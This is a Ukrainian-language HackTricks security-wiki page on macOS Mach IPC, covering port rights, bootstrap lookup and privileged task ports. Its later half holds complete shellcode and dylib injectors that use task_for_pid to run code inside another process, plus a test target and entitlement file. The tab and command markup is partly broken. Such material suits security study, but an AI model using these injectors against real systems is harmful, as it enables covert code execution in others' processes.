# macOS IPC - Міжпроцесне спілкування

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>

## Повідомлення Mach через порти

### Основна інформація

Mach використовує **задачі** як **найменшу одиницю** для обміну ресурсами, і кожна задача може містити **кілька потоків**. Ці **задачі та потоки відображаються відношенням 1:1 до процесів та потоків POSIX**.

Спілкування між задачами відбувається через міжпроцесне спілкування Mach (IPC), використовуючи односторонні канали зв'язку. **Повідомлення передаються між портами**, які діють як **черги повідомлень**, керовані ядром.

Кожен процес має **таблицю IPC**, де можна знайти **порти mach процесу**. Назва порту Mach фактично є числом (вказівником на об'єкт ядра).

Процес також може надіслати ім'я порту з деякими правами **іншій задачі**, і ядро зробить цей запис у **таблиці IPC іншої задачі**.

### Права порту

Права порту, які визначають операції, які може виконувати задача, є ключовими для цього спілкування. Можливі **права порту** ([визначення тут](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Право отримання**, яке дозволяє отримувати повідомлення, відправлені на порт. Порти Mach є чергами MPSC (багатопродуктові, одноконсумерні), що означає, що може бути тільки **одне право отримання для кожного порту** в усій системі (на відміну від каналів, де кілька процесів можуть утримувати дескриптори файлів для читання з одного каналу).
* **Задача з правом отримання** може отримувати повідомлення та **створювати права відправки**, що дозволяє відправляти повідомлення. Спочатку тільки **власна задача має право отримання на свій порт**.
* **Право відправки**, яке дозволяє відправляти повідомлення на порт.
* Право відправки може бути **клоноване**, тому задача, яка володіє правом відправки, може скопіювати право та **надати його третій задачі**.
* **Право відправки один раз**, яке дозволяє відправити одне повідомлення на порт, після чого воно зникає.
* **Право на набір портів**, яке вказує на _набір портів_, а не один окремий порт. Вибірка повідомлення з набору портів вибирає повідомлення з одного з його портів. Набори портів можуть використовуватися для прослуховування кількох портів одночасно, схоже на `select`/`poll`/`epoll`/`kqueue` в Unix.
* **Мертве ім'я**, яке не є фактичним правом порту, а лише заповнювачем. Коли порт знищується, всі існуючі права порту на порт перетворюються на мертві імена.

**Задачі можуть передавати ПРАВА ВІДПРАВКИ іншим**, дозволяючи їм відправляти повідомлення назад. **ПРАВА ВІДПРАВКИ також можуть бути клоновані, тому задача може скопіювати право та **надати його третій задачі**. Це, разом із проміжним процесом, відомим як **ініціалізаційний сервер**, дозволяє ефективне спілкування між задачами.

### Порти файлів

Порти файлів дозволяють інкапсулювати дескриптори файлів у портах Mac (з використанням прав портів Mach). Можливо створити `fileport` з вказаним FD за допомогою `fileport_makeport` та створити FD з fileport за допомогою `fileport_makefd`.

### Встановлення зв'язку

#### Кроки:

Як зазначено, для встановлення каналу спілкування включений **ініціалізаційний сервер** (**launchd** в Mac).

1. Задача **A** ініціює **новий порт**, отримуючи **право отримання** в процесі.
2. Задача **A**, яка є власником права отримання, **створює право відправки для порту**.
3. Задача **A** встановлює **з'єднання** з **ініціалізаційним сервером**, надаючи **ім'я служби порту** та **право відправки** через процедуру, відому як реєстрація ініціалізації.
4. Задача **B** взаємодіє з **ініціалізаційним сервером**, щоб виконати пошук ініціалізації для **імені служби**. У разі успіху **сервер копіює право відправки**, отримане від Задачі A, та **передає його Задачі B**.
5. Після отримання права відправки, Задача **B** може **формулювати** **повідомлення** та відправляти його **Задачі A**.
6. Для двостороннього спілкування зазвичай задача **B** створює новий порт з **правом отримання** та **правом відправки**, і надає **право відправки Задачі A**, щоб вона могла відправляти повідомлення ЗАДАЧІ B (двостороннє спілкування).

Ініціалізаційний сервер **не може аутентифікувати** ім'я служби, вказане задачею. Це означає, що **задача** може потенційно **підробити будь-яку системну задачу**, наприклад, **фальшиво вказати ім'я служби авторизації** та потім схвалювати кожен запит.

Потім Apple зберігає **імена служб, наданих системою**, у захищених конфігураційних файлах, розташованих в **каталогах, захищених SIP**: `/System/Library/LaunchDaemons` та `/System/Library/LaunchAgents`. Поруч з кожним ім'ям служби також зберігається **пов'язаний бінарний файл**. Ініціалізаційний сервер створить та утримує **право отримання для кожного з цих імен служб**.

Для цих попередньо визначених служб **процес пошуку відрізняється трохи**. Під час пошуку імені служби launchd динамічно запускає службу. Новий робочий процес виглядає наступним чином:

* Задача **B** ініціює пошук ініціалізації для імені служби.
* **launchd** перевіряє, чи працює задача, і якщо ні, **запускає** її.
* Задача **A** (служба) виконує **перевірку ініціалізації**. Тут **ініціалізаційний** сервер створює право відправки, утримує його та **передає право отримання Задачі A**.
* launchd копіює **право відправки та відправляє його Задачі B**.
* Задача **B** створює новий порт з **правом отримання** та **правом відправки**, і надає **право відправки Задачі A** (службі), щоб вона могла відправляти повідомлення ЗАДАЧІ B (двостороннє спілкування).

Однак цей процес застосовується лише до попередньо визначених системних задач. Несистемні задачі все ще працюють, як описано спочатку, що потенційно може дозволити підробку. 

### Повідомлення Mach

[Дізнайтеся більше тут](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Функція `mach_msg`, в сутності системний виклик, використовується для відправлення та отримання повідомлень Mach. Функція вимагає, щоб повідомлення було відправлено як початковий аргумент. Це повідомлення повинно починатися зі структури `mach_msg_header_t`, за якою йде вміст самого повідомлення. Структура визначається наступним чином:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Процеси, які мають _**право на отримання**_, можуть отримувати повідомлення на порті Mach. Натомість **відправники** мають _**право на відправку**_ або _**право на відправку одного разу**_. Право на відправку одного разу призначене виключно для відправлення одного повідомлення, після чого воно стає недійсним.

Для досягнення простої **двосторонньої комунікації** процес може вказати **порт Mach** у заголовку mach **повідомлення**, який називається _портом відповіді_ (**`msgh_local_port`**), де **отримувач** повідомлення може **відправити відповідь** на це повідомлення. Бітові прапорці в **`msgh_bits`** можуть бути використані для **вказівки** того, що **право на відправку одного разу** повинно бути похідним та переданим для цього порту (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
Зверніть увагу, що цей вид двосторонньої комунікації використовується в повідомленнях XPC, які очікують відповіді (`xpc_connection_send_message_with_reply` та `xpc_connection_send_message_with_reply_sync`). Проте **зазвичай створюються різні порти**, як пояснено раніше, для створення двосторонньої комунікації.
{% endhint %}

Інші поля заголовка повідомлення:

* `msgh_size`: розмір усього пакета.
* `msgh_remote_port`: порт, на який відправляється це повідомлення.
* `msgh_voucher_port`: [порти ваучерів Mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: ідентифікатор цього повідомлення, який інтерпретується отримувачем.

{% hint style="danger" %}
Зверніть увагу, що **mach-повідомлення відправляються через порт mach**, який є **одним отримувачем**, **каналом зв'язку з кількома відправниками**, вбудованим у ядро mach. **Декілька процесів** можуть **відправляти повідомлення** на порт mach, але в будь-який момент лише **один процес може читати** з нього.
{% endhint %}

### Перерахувати порти
```bash
lsmp -p <pid>
```
Ви можете встановити цей інструмент в iOS, завантаживши його з [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Приклад коду

Зверніть увагу, як **відправник** виділяє порт, створює **право на відправку** для імені `org.darlinghq.example` та надсилає його на **сервер завантаження**, тоді як відправник запросив **право на відправку** цього імені та використовував його для **надсилання повідомлення**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}sender.c{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Привілейовані порти

* **Порт хоста**: Якщо процес має **право на відправку** через цей порт, він може отримати **інформацію** про **систему** (наприклад, `host_processor_info`).
* **Привілейований порт хоста**: Процес з **правом на відправку** через цей порт може виконувати **привілейовані дії**, наприклад завантаження розширення ядра. **Процес повинен бути root**, щоб отримати це дозвіл.
* Крім того, для виклику API **`kext_request`** потрібно мати інші дозволи **`com.apple.private.kext*`**, які надаються лише бінарним файлам Apple.
* **Порт імені завдання**: Непривілейована версія _порту завдання_. Він посилається на завдання, але не дозволяє його контролювати. Єдине, що, здається, доступно через нього, це `task_info()`.
* **Порт завдання** (також відомий як ядерний порт)**:** З правом на відправку через цей порт можна контролювати завдання (читання/запис пам'яті, створення потоків...).
* Викличте `mach_task_self()` для **отримання імені** цього порту для викликаючого завдання. Цей порт **спадковий** тільки під час **`exec()`**; нове завдання, створене за допомогою `fork()`, отримує новий порт завдання (як виняток, завдання також отримує новий порт завдання після `exec()` у suid-бінарних файлах). Єдиний спосіб створити завдання та отримати його порт - виконати ["танець обміну портами"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) під час виконання `fork()`.
* Це обмеження доступу до порту (з `macos_task_policy` з бінарного файлу `AppleMobileFileIntegrity`):
* Якщо додаток має **дозвіл на отримання завдання** **`com.apple.security.get-task-allow`**, процеси від **того ж користувача можуть отримати доступ до порту завдання** (зазвичай додано Xcode для налагодження). Процес **не дозволить** це для виробничих версій під час **підписування**.
* Додатки з дозволом **`com.apple.system-task-ports`** можуть отримати **порт завдання для будь-якого** процесу, крім ядра. У старих версіях це називалося **`task_for_pid-allow`**. Це надається лише додаткам Apple.
* **Root може отримати доступ до портів завдань** додатків, **не** скомпільованих з **захищеним** режимом виконання (і не від Apple). 

### Впровадження шелл-коду в потік через порт завдання

Ви можете отримати шелл-код з:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Скомпілюйте** попередню програму та додайте **привілеї**, щоб мати можливість впроваджувати код з тим самим користувачем (якщо ні, вам доведеться використовувати **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Впровадження Dylib у потік через порт завдання

У macOS **потоки** можуть бути маніпульовані через **Mach** або за допомогою **posix `pthread` api**. Потік, який ми створили у попередньому впровадженні, був створений за допомогою Mach api, тому **він не є сумісним з posix**.

Було можливо **впровадити простий шелл-код** для виконання команди, оскільки **не потрібно було працювати з posix**-сумісними api, лише з Mach. **Більш складні впровадження** потребують, щоб **потік** також був **сумісним з posix**.

Отже, для **покращення потоку** його слід викликати **`pthread_create_from_mach_thread`**, який створить дійсний pthread. Потім цей новий pthread може **викликати dlopen** для **завантаження dylib** з системи, тому замість написання нового шелл-коду для виконання різних дій можна завантажити власні бібліотеки.

Ви можете знайти **приклади dylibs** в (наприклад, той, який генерує журнал, який потім можна прослуховувати):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Неможливо встановити дозволи пам'яті для коду віддаленого потоку: Помилка %s\n", mach_error_string(kr));
return (-4);
}

// Встановлення дозволів на виділену пам'ять стеку
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Неможливо встановити дозволи пам'яті для стеку віддаленого потоку: Помилка %s\n", mach_error_string(kr));
return (-4);
}


// Створення потоку для виконання shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // це справжній стек
//remoteStack64 -= 8;  // потрібне вирівнювання 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Віддалений стек 64  0x%llx, Віддалений код %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Неможливо створити віддалений потік: помилка %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Використання: %s _pid_ _дія_\n", argv[0]);
fprintf (stderr, "   _дія_: шлях до dylib на диску\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib не знайдено\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
